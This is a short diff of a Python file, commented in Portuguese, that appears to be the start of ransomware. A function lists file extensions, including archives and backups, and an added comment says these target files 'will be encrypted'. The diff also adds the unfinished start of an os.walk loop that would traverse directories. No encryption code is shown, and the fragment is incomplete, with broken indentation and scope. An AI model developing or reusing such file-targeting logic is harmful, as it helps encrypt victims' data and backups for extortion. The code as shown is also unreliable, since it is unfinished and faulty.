@@ -2,6 +2,8 @@
 
 import os
 
+
+#Extensões de possiveis arquivos alvos, que serão encriptadas
 def discovery(initial_path):
         extensions = [
         # 'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img'  # Arquivos do Sitema
@@ -24,3 +26,6 @@ def discovery(initial_path):
         'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',  # Arquivos compactados e Backups
 
     ]
+
+for dirpath, dirs, files in os.walk(initial_path):
+    
